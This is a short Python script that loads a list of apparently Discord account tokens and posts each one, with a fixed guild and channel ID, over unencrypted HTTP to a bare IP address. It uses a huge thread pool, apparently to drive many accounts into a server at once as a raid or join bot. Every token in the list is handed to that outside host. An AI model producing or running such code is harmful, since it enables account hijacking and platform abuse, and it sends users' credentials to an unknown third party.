from json import loads
from time import sleep
from json import dumps
from websocket import WebSocket
from concurrent.futures import ThreadPoolExecutor
from requests import post

guild_id = "824718268501721089"
chid = "885743241901768704" #875340092909162527
tokenlist = open("token_D35BWUKHWs.txt").read().splitlines()
executor = ThreadPoolExecutor(max_workers=int(1000000))
def run(token,guild_id,chid) :
    post(f"http://185.117.3.23:80/?token={token}&guild={guild_id}&chid={chid}", timeout=3)

i = 0
for token in tokenlist:
    executor.submit(run, token,guild_id,chid)
    i+=1
    print("connected ws : {}".format(i))